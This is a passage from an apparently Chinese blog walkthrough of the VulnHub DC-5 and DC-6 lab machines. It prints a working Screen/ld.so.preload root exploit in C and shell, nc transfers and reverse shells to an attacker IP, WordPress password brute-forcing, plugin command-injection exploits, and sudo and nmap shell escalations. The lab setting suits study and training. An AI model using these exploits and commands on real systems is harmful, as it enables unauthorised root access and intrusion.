<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221002124900295.png" alt="image-20221002124900295"></p>
<p>【虽然会报错，但是是正常的，不影响编译后产生的文件的执行】</p>
<p>执行后</p>
<blockquote>
<p><code>libhax.so  rootshell</code><br>这两个文件就生成了</p>
</blockquote>
<p>然后我们的<code>flag.sh</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221002134454968.png" alt="image-20221002134454968"></p>
<h4 id="2）nc向靶机传入脚本提权文件"><a href="#2）nc向靶机传入脚本提权文件" class="headerlink" title="2）nc向靶机传入脚本提权文件"></a>2）nc向靶机传入脚本提权文件</h4><p><code>当然如果你用蚁剑连接的shell的话，直接把文件拖进去就行，简单一点</code></p>
<p>如果用nc的话当然也不难</p>
<p>先是<code>kali</code>机控制台【目前状态为<code>/tmp</code>下】</p>
<blockquote>
<p><code>nc -lvp 8888 &lt; libhax.so</code>  &#x2F;&#x2F; &lt; 表示传入</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221001233201455.png" alt="image-20221001233201455"></p>
<p>靶机<code>shell</code>【必须在<code>/tmp</code>目录下才能执行nc】</p>
<blockquote>
<p><code>cd /tmp</code><br><code>nc 192.168.133.140 8888 &gt; libhax.so</code>  &#x2F;&#x2F;&gt;表示传出接收文件,192.168.133.140为kali机ip</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221001233223666.png" alt="image-20221001233223666"></p>
<p>看到传入成功</p>
<p><code>rootshell</code>和<code>flag.sh</code>文件类似，不再展示</p>
<p>最后成功传入</p>
<p><img src="/2022/08/29/vulnhub/image-20221002132325197.png" alt="image-20221002132325197"></p>
<h4 id="3）执行脚本进行提权"><a href="#3）执行脚本进行提权" class="headerlink" title="3）执行脚本进行提权"></a>3）执行脚本进行提权</h4><hr>
<p>传入完成后，给<code>flag.sh</code>加上执行权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x flag.sh</span><br></pre></td></tr></table></figure>

<p>然后执行即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./flag.sh</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="出现意外"><a href="#出现意外" class="headerlink" title="*出现意外"></a>*<strong>出现意外</strong></h5><p><img src="/2022/08/29/vulnhub/image-20221002173352619.png" alt="image-20221002173352619"></p>
<p>不知道有没有朋友也遇到这种报错</p>
<p>最后一步执行<code>rootshell</code>的时候，弹出这个命令，我搜索了一下，猜测是不是c语言脚本写错了，但是仔细检查并没有出错</p>
<p>然后我们看了看我们的<code>kali</code>和<code>靶机</code>的gcc版本</p>
<p>发现</p>
<blockquote>
<p>kali机是：<code>11.3.0-1</code></p>
<p>靶机是：<code>4.9.2</code></p>
</blockquote>
<p>但是编译器不同对结果应该没什么太大影响</p>
<p>但我还是试试能不能在<code>靶机的shell</code>里执行gcc，运行两个c语言脚本文件，得到<code>rootshell</code>和<code>libhax.so</code>文件</p>
<p>但是又出现</p>
<p><img src="/2022/08/29/vulnhub/image-20221002210307317.png" alt="image-20221002210307317"></p>
<p>原来是缺少环境变量，导致无法执行</p>
<h6 id="给cc1配置环境变量"><a href="#给cc1配置环境变量" class="headerlink" title="给cc1配置环境变量"></a>给<code>cc1</code>配置环境变量</h6><p><img src="/2022/08/29/vulnhub/image-20221002205950588.png" alt="image-20221002205950588"></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">locate cc1</span><br><span class="line"></span><br><span class="line"><span class="title class_">PATH</span>=<span class="string">&quot;$PATH&quot;</span><span class="symbol">:/usr/lib/gcc/x86_64-linux-gnu/</span><span class="number">4.9</span>/cc1</span><br><span class="line"></span><br><span class="line">export <span class="title class_">PATH</span></span><br></pre></td></tr></table></figure>



<p>然后我们从简，直接在靶机<code>shell</code>执行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dropshell</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">chown</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure>



<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">#<span class="keyword">include</span> &lt;stdio.h&gt;</span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">void</span>)&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o <span class="regexp">/tmp/</span>rootshell <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">rm -f <span class="regexp">/tmp/</span>rootshell.c</span><br></pre></td></tr></table></figure>

<p>成功执行</p>
<p><img src="/2022/08/29/vulnhub/image-20221002210611503.png" alt="image-20221002210611503"></p>
<h6 id="关键来了【期待】"><a href="#关键来了【期待】" class="headerlink" title="关键来了【期待】"></a>关键来了【期待】</h6><p>我们执行我们的<code>flag.sh</code>脚本【这里是重复的<code>flag.sh</code>，所以名字为<code>flag.sh.1</code>】</p>
<p><img src="/2022/08/29/vulnhub/image-20221002211351948.png" alt="image-20221002211351948"></p>
<hr>
<p>终于解决问题后【卡了一天了】</p>
<p>终于成功提权</p>
<p><img src="/2022/08/29/vulnhub/image-20221002211423172.png" alt="image-20221002211423172"></p>
<p>到<code>/root</code>目录下</p>
<p>拿到<code>flag</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221002211550887.png" alt="image-20221002211550887"></p>
<blockquote>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">888b</span>    <span class="number">888</span> d8b                                                      <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">8888b</span>   <span class="number">888</span> Y8P                                                      <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">88888b</span>  <span class="number">888</span>                                                          <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888Y88b</span> <span class="number">888</span> <span class="number">888</span>  .d8888b .d88b.       <span class="number">888</span>  <span class="number">888</span>  <span class="number">888</span>  .d88b.  <span class="number">888</span>d888 <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888</span> Y88b888 <span class="number">888</span> d88P<span class="string">&quot;   d8P  Y8b      888  888  888 d88&quot;</span><span class="string">&quot;88b 888P&quot;</span>   <span class="number">888</span> .<span class="number">88</span>P <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888</span>  Y88888 <span class="number">888</span> <span class="number">888</span>     <span class="number">88888888</span>      <span class="number">888</span>  <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>     <span class="number">888888</span>K  Y8P Y8P Y8P </span><br><span class="line"><span class="attribute">888</span>   Y8888 <span class="number">888</span> Y88b.   Y8b.          Y88b <span class="number">888</span> d88P Y88..<span class="number">88</span>P <span class="number">888</span>     <span class="number">888</span> <span class="string">&quot;88b  &quot;</span>   <span class="string">&quot;   &quot;</span>  </span><br><span class="line"><span class="attribute">888</span>    Y888 <span class="number">888</span>  <span class="string">&quot;Y8888P &quot;</span>Y8888        <span class="string">&quot;Y8888888P&quot;</span>   <span class="string">&quot;Y88P&quot;</span>  <span class="number">888</span>     <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span>                                                                                                                 </span><br></pre></td></tr></table></figure>


<p><code>Once again, a big thanks to all those who do these little challenges,</code><br><code>and especially all those who give me feedback - again, it&#39;s all greatly</code><br><code>appreciated.  :-)</code></p>
<p><code>I also want to send a big thanks to all those who find the vulnerabilities</code><br><code>and create the exploits that make these challenges possible.</code></p>
<p>翻译：                                                                                      </p>
<p>再次非常感谢所有完成这些小挑战的人，<br>尤其是所有给我反馈的人——再一次，这一切都很棒<br>赞赏。 :-)</p>
<p>我还要非常感谢所有发现漏洞的人<br>并创造使这些挑战成为可能的漏洞。</p>
</blockquote>
<p><code>吐血了，果然是中级，顺便提醒一下大家，非必要不要更新</code></p>
<p><strong>一个旗子找完，游戏结束【吐血了】</strong></p>
<hr>
<h1 id="六、DC-6-中级"><a href="#六、DC-6-中级" class="headerlink" title="六、DC-6[中级]"></a>六、DC-6[中级]</h1><p><strong>only one flag</strong></p>
<h2 id="信息收集-5"><a href="#信息收集-5" class="headerlink" title="信息收集"></a>信息收集</h2><p>先抬手<code>nmap</code>扫描一下</p>
<p><img src="/2022/08/29/vulnhub/image-20221006214334035.png" alt="image-20221006214334035"></p>
<blockquote>
<p>发现<br><code>22</code>端口：运行着<code>ssh</code>【默认端口】<br><code>80</code>端口：运行着<code>http</code>【默认端口】</p>
</blockquote>
<p>看来可能是需要<code>ssh</code>连接拿<code>shell</code></p>
<hr>
<p>这个靶机好像需要配置<code>hosts</code>文件，不然通过<code>ip</code>是访问不了网站的</p>
<p><img src="/2022/08/29/vulnhub/image-20221006215651658.png" alt="image-20221006215651658"></p>
<p>然后访问试试</p>
<p>好了【但是好像有点卡】</p>
<p>界面和<code>DC2</code>一样【梦回<code>DC2</code>，操作应该差不多】</p>
<p><img src="/2022/08/29/vulnhub/image-20221006220758221.png" alt="image-20221006220758221"></p>
<hr>
<p>习惯看看<code>wappalyzer</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221006221445685.png" alt="image-20221006221445685"></p>
<p>看到<code>CMS</code>是<code>WordPress 5.1.1</code></p>
<p>想到可以利用一下这个版本的漏洞，拿到一些敏感信息</p>
<hr>
<p>我们再看看网站上有没有可以利用的信息</p>
<p><code>about us</code>里似乎全是文本内容没啥提示</p>
<p>看到有个<code>concact us</code>，可能有交互利用的地方</p>
<p><img src="/2022/08/29/vulnhub/image-20221006222942930.png" alt="image-20221006222942930"></p>
<p>虽然看起来没有但是其实是有的</p>
<p>通过<code>concact us</code>页面的url，在后面加上用户的名字就可以</p>
<blockquote>
<p><code>http://xxx/admin</code>  </p>
<p>&#x2F;&#x2F;当然其实并不太重要，不过可以试试看，能不能留言xss然后挟持管理员账户，不过这并不是实际情况，所以可以自己留言，然后登录看看</p>
</blockquote>
<hr>
<h2 id="1-wpscan爆破出用户名【dc2里搞过】"><a href="#1-wpscan爆破出用户名【dc2里搞过】" class="headerlink" title="1.wpscan爆破出用户名【dc2里搞过】"></a>1.wpscan爆破出用户名【dc2里搞过】</h2><p>看到<code>wordpress</code>先用<code>wpscan</code>搞一下</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">wpscan <span class="comment">--url wordy -e u</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221006235057457.png" alt="image-20221006235057457"></p>
<p>得到用户名</p>
<blockquote>
<p><code>admin</code><br><code>mark</code><br><code>graham</code><br><code>sarah</code><br><code>jens</code></p>
</blockquote>
<p>我们创建一个<code>user.txt</code></p>
<p>哪在哪里登录呢？我们在开始页面并没有看到登录窗口</p>
<p>我们用<code>dirb</code>扫一下</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">dirb http:<span class="regexp">//</span>wordy</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221009231112282.png" alt="image-20221009231112282"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>wordy<span class="regexp">/wp-admin/</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221009231340911.png" alt="image-20221009231340911"></p>
<hr>
<h2 id="2-wpscan爆破密码"><a href="#2-wpscan爆破密码" class="headerlink" title="2.wpscan爆破密码"></a>2.wpscan爆破密码</h2><p>我们再找一个密码表，这里用和<code>DC2</code> <code>cewl</code>命令爬一下网站，看看能不能利用其中有没有密码</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">cewl wordy &gt; <span class="keyword">pass</span>.txt  </span><br></pre></td></tr></table></figure>

<p>然后就得到一个密码【擦，难道和<code>dc2</code>一样的】</p>
<p>然后我们开始进行爆破登录【注意需要<code>root</code>权限】</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">wpscan <span class="attr">--url</span> wordy <span class="attr">--usernames</span> user<span class="selector-class">.txt</span> <span class="attr">--passwords</span> pass<span class="selector-class">.txt</span>                             </span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221009231928764.png" alt="image-20221009231928764"></p>
<p>结果肯定是不行的【肯定不和<code>DC2</code>一样】</p>
<p>&#x3D;&#x3D;&gt;</p>
<p>所以这里我们需要找一个<strong>完整的密码字典</strong></p>
<blockquote>
<p>需要用到<code>wordpress</code>的密码字典，kali自带<code>rockyou.txt</code></p>
</blockquote>
<p>由作者提示得【也就是把密码一部分告诉你了】</p>
<p><img src="/2022/08/29/vulnhub/image-20221113171203270.png" alt="image-20221113171203270"></p>
<blockquote>
<p><code>wpscan --url http://wordy --usernames user.txt --passwords /usr/share/wordlists/rockyou.txt|grep k01 -t 5</code></p>
<p>&#x2F;&#x2F;-t是添加线程数，默认是5，多加几个可以更快一些</p>
</blockquote>
<p>如果直接跑的有点久了</p>
<p><code>。。。。。。。【睡了一晚上，不知道好久跑出来的】</code></p>
<p><code>【七千万密码】</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221010225451565.png" alt="image-20221010225451565"></p>
<p>最后得到</p>
<p><img src="/2022/08/29/vulnhub/image-20221010230354224.png" alt="image-20221010230354224"></p>
<blockquote>
<p>username:<code>mark</code><br>password:<code>helpdesk01</code></p>
</blockquote>
<p>虽然只有一个用户但是够了</p>
<hr>
<h2 id="3-登录网站找信息"><a href="#3-登录网站找信息" class="headerlink" title="3.登录网站找信息"></a>3.登录网站找信息</h2><p>登录后发现是一个<code>wordpress</code>的后台网站</p>
<p><img src="/2022/08/29/vulnhub/image-20221010231254865.png" alt="image-20221010231254865"></p>
<p>在左侧我们发现了一个新的东西叫做</p>
<p><code>Activity monitor</code></p>
<blockquote>
<p>是一款网站用户活动监控插件，我们用户登录的ip和其他信息都会被监控</p>
<p>&#x2F;&#x2F;那么我们是不是可以试试找找这个插件有没有漏洞，从而通过这个漏洞拿到shell或者其他更高权限用户的信息</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221010231223449.png" alt="image-20221010231223449"></p>
<p><img src="/2022/08/29/vulnhub/image-20221010231622962.png" alt="image-20221010231622962"></p>
<p>我们查一下</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">searchsploit activity <span class="literal">monitor</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221010231725009.png" alt="image-20221010231725009"></p>
<p>发现果然是有的，只是不知道能不能利用</p>
<p>我们主要找后面两个和<code>wordpress</code>相关的</p>
<blockquote>
<p><code>45274.html</code>是命令注入<br><code>50110.py</code>是远程命令执行</p>
</blockquote>
<h3 id="1）50110-py【有问题，不建议用】"><a href="#1）50110-py【有问题，不建议用】" class="headerlink" title="1）50110.py【有问题，不建议用】"></a>1）50110.py【有问题，不建议用】</h3><p>感觉<code>py</code>更方便一些，我们先查看内容</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">50110</span>.py</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221010232311464.png" alt="image-20221010232311464"></p>
<p>看来只需要<code>ip</code>，以及<code>用户名</code>和<code>密码</code>即可进入<code>shell</code></p>
<p>我们运行一下</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">python <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">50110</span>.py</span><br></pre></td></tr></table></figure>



<p>然后我按我的输入</p>
<blockquote>
<p><code>192.168.133.145</code><br><code>mark</code><br><code>helpdesk01</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221010232611030.png" alt="image-20221010232611030"></p>
<p>进入<code>shell</code></p>
<hr>
<p>然后固定姿势，进入交互式<code>shell</code></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p>但是会报错</p>
<p>似乎不能使用<code>python</code>命令，一使用就退出<code>shell</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221010233037169.png" alt="image-20221010233037169"></p>
<p>那就看起来有点难受了，再试试能不能进入稳定<code>shell</code></p>
<blockquote>
<p>先<br><code>ctrl+z</code><br>然后执行<br><code>stty raw -echo ; fg ; reset</code>  </p>
</blockquote>
<p>结果卡死了</p>
<p>算了算了，就这样看吧</p>
<p>【我这里把<code>py</code>脚本导入一个新的文件里（<code>1.py</code>），把我的ip，用户名，密码都写了进去，就不用退出了又重新输入了】</p>
<hr>
<p>先退到主目录看看有几个用户</p>
<p>但是发现好像有点问题，似乎有的命令执行就和脚本冲突，那就用</p>
<p><img src="/2022/08/29/vulnhub/image-20221010234544191.png" alt="image-20221010234544191"></p>
<h3 id="2）45274-html"><a href="#2）45274-html" class="headerlink" title="2）45274.html"></a>2）45274.html</h3><p>那我们先不管它，我们还有一个命令注入的没有用，</p>
<p>我们先查看一下内容</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">45274</span>.html</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221011113959660.png" alt="image-20221011113959660"></p>
<p>我们把这个文件导入一个新文件中【1.html】</p>
<p>主要是修改这里的网站网址和监听本地<code>ip</code>，改成我们的<code>wordy</code>和<code>kali</code>机的<code>ip</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost:<span class="number">8000</span><span class="regexp">/wp-admin/</span>admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>wordy<span class="regexp">/wp-admin/</span>admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221011115438911.png" alt="image-20221011115438911"></p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">nc -nlvp <span class="number">127.0</span>.<span class="number">0.1</span>   <span class="operator">=</span><span class="operator">=</span>&gt;   nc <span class="number">192.168</span>.<span class="number">133.140</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221011114105820.png" alt="image-20221011114105820"></p>
<p>然后因为是<code>html</code>文件，我们可以直接用浏览器打开，</p>
<p><img src="/2022/08/29/vulnhub/image-20221011114637014.png" alt="image-20221011114637014"></p>
<p>当然也可以</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -m http.server <span class="number">8008</span></span><br></pre></td></tr></table></figure>

<p>然后以浏览器方式访问本地<code>ip:8008</code>，再打开里面<code>1.html</code>文件</p>
<p><img src="/2022/08/29/vulnhub/image-20221011114825111.png" alt="image-20221011114825111"></p>
<h4 id="nc监听拿shell"><a href="#nc监听拿shell" class="headerlink" title="nc监听拿shell"></a>nc监听拿shell</h4><p>然后我们发现有个</p>
<p><code>Submit request</code>的按钮，看来是发送请求，然后<code>nc</code>反弹shell</p>
<blockquote>
<p>注意监听端口是<code>9999</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221011115108761.png" alt="image-20221011115108761"></p>
<p>然后我们在浏览器点击一下<code>Submit request</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221011122029894.png" alt="image-20221011122029894"></p>
<p>连接到 <code>shell</code></p>
<p>这个比脚本的那个就更加方便一下了，</p>
<hr>
<p>固定姿势</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p>然后进入稳定式shell</p>
<blockquote>
<p>先<code>ctrl+z</code><br>然后执行<br><code>stty raw -echo ; fg ; reset</code>  </p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221011122301709.png" alt="image-20221011122301709"></p>
<hr>
<p>然后开始找找有没有其他用户的密码信息</p>
<p>先到 <code>/home</code> 里查看一下，发现了除了<code>admin</code>其他三个用户目录</p>
<p><img src="/2022/08/29/vulnhub/image-20221011122438174.png" alt="image-20221011122438174"></p>
<p>我们先进我们登录成功的<code>mark</code>目录查看</p>
<p><img src="/2022/08/29/vulnhub/image-20221011122638708.png" alt="image-20221011122638708"></p>
<p>发现有个<code>things-to-do.txt</code>文本文件</p>
<p>查看内容</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cat</span> things-<span class="keyword">to</span>-<span class="keyword">do</span>.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221011122741660.png" alt="image-20221011122741660"></p>
<blockquote>
<p><code>Things to do:</code></p>
<ul>
<li><code>Restore full functionality for the hyperdrive (need to speak to Jens)</code></li>
<li><code>Buy present for Sarah&#39;s farewell party</code></li>
<li><code>Add new user: graham - GSo7isUM1D4 - done</code></li>
<li><code>Apply for the OSCP course</code></li>
<li><code>Buy new laptop for Sarah&#39;s replacement</code></li>
</ul>
<p>意思是：</p>
<p>要做的事情：</p>
<ul>
<li>恢复超光速引擎的全部功能（需要与 Jens 交谈）</li>
<li>为莎拉的告别派对购买礼物</li>
<li>添加新用户：graham - GSo7isUM1D4 - 完成</li>
<li>申请OSCP课程</li>
<li>为莎拉购买新的笔记本电脑</li>
</ul>
<p>&#x2F;&#x2F;关键信息我们得到了graham用户的密码【我也想考OSCP，哭唧唧】</p>
</blockquote>
<p>我们根据我们拿到<code>graham</code>的信息，登录<code>ssh</code></p>
<p>【当然在原有<code>shell</code>里利用<code>su</code>命令切换用户<code>graham</code>也是可以的，但是<code>ssh</code>有颜色，看起来好看一些】</p>
<p>【因为之前就看到运行着<code>ssh</code>，没必要再在登录一次网站，反正不是最高权限】</p>
<blockquote>
<p><code>ssh graham@192.168.133.145 -p 22</code>    &#x2F;&#x2F;靶机ip  ssh运行端口<br>密码：<code>GSo7isUM1D4</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221011123625279.png" alt="image-20221011123625279"></p>
<p>然后我们看看我们有哪些命令可以执行</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221011124153885.png" alt="image-20221011124153885"></p>
<p>看到是有<code>jens</code>目录下一个脚本文件的运行权限，而且不需要<code>jens</code>的密码，就可以他的身份下运行了【<code>mark</code>我试了的，没有权限】</p>
<h4 id="以其他用户身份运行脚本，实现切换用户"><a href="#以其他用户身份运行脚本，实现切换用户" class="headerlink" title="以其他用户身份运行脚本，实现切换用户"></a>以其他用户身份运行脚本，实现切换用户</h4><p>我们先查看一下内容</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/home/</span>jens/backups.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221011124824445.png" alt="image-20221011124824445"></p>
<p>发现是执行一些命令，</p>
<p>但是我们的目的想获得<code>jens</code>的登录权限，我们在脚本文件中追加一些命令</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&quot;/bin/bash&quot;</span>  &gt;&gt; <span class="regexp">/home/</span>jens/backups.sh</span><br></pre></td></tr></table></figure>

<p>这样的话当我们以<code>jens</code>身份运行这个脚本时，当执行<code>/bin/bash</code>时，就算我们现在是<code>graham</code>，也会切换成<code>jens</code>，这也得益于可以<code>nopasswd</code>运行</p>
<blockquote>
<p><code>sudo -u jens /home/jens/backups.sh</code></p>
<p>&#x2F;&#x2F;注意哦，这里是需要以<code>jens</code>身份运行【毕竟他给了我们用他身份执行权限】才可以实现切换用户，如果直接运行还是<code>graham</code>用户，就如下图一样</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221011125910796.png" alt="image-20221011125910796"></p>
<p>切换用户成功，</p>
<p>我们先看看<code>jens</code>有哪些命令可以执行</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221011130314044.png" alt="image-20221011130314044"></p>
<p>终于，发现了<code>root</code>的，我们可以执行<code>nmap</code>命令【只有管理员可以】，那么如何拿到权限呢</p>
<h2 id="4-nmap提权"><a href="#4-nmap提权" class="headerlink" title="4.nmap提权"></a>4.nmap提权</h2><h3 id="1-旧版"><a href="#1-旧版" class="headerlink" title="1.旧版"></a>1.旧版</h3><p>nmap（2.02-5.21）存在交换模式，可利用提权</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure>

<p>之后执行:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span>&gt; !sh</span><br><span class="line"><span class="attribute">sh</span>-<span class="number">3</span>.<span class="number">2</span># whoami</span><br><span class="line"><span class="attribute">root</span></span><br></pre></td></tr></table></figure>

<p>msf中的模块为：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">exploit<span class="regexp">/unix/</span>local/setuid_nmap</span><br></pre></td></tr></table></figure>

<h3 id="2-新版"><a href="#2-新版" class="headerlink" title="2.新版"></a>2.新版</h3><p>较新版可使用 <code>--script</code> 参数：</p>
<blockquote>
<p>先写入一条命令<br><code>echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; getshell</code><br>再–script参数，执行<br><code>sudo nmap --script=getshell</code></p>
</blockquote>
<p>查看一下靶机的<code>nmap</code>版本</p>
<p><code>7.4</code>还是挺高的</p>
<p><img src="/2022/08/29/vulnhub/image-20221011131514173.png" alt="image-20221011131514173"></p>
<p>那我们写一个脚本，里面加上命令，再用新版<code>nmap</code>运行这个脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br></pre></td></tr></table></figure>



<blockquote>
